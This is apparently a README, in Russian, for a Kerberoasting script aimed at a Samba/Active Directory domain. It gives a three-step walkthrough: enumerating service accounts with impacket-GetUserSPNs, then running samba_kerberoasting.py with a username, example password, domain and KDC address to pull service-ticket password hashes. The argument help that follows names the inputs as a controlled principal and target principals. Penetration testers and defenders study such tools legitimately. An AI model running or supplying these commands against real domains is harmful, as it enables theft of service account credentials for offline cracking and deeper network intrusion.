# Kerberoasting

## Пример

1. Получим список сервисных учетных записей

```bash
KRB5CCNAME=tgs-ldap.ccache impacket-GetUserSPNs COMPANY.ALT/petrov -k -no-pass
```

2. Создаем список сервисных учетных записей

3. Выполняем команду для получения хэш-паролей

```bash
python samba_kerberoasting.py -u petrov -p P@ssw0rd -d COMPANY.ALT -H 100.64.0.23 -t users.txt
```

## Аргументы

```
usage: samba_kerberoasting.py [-h] -u USERNAME -p PASSWORD -d DOMAIN -H HOST [-v] -t TARGETS

options:
  -h, --help            show this help message and exit
  -u USERNAME, --username USERNAME
                        Username of controlled principal
  -p PASSWORD, --password PASSWORD
                        Password of controlled principal
  -d DOMAIN, --domain DOMAIN
                        Domain name, e.g. domain.local
  -H HOST, --host HOST  IP address or FQDN of KDC
  -v, --verbose         Verbose mode
  -t TARGETS, --targets TARGETS
                        Path to file with target principals
```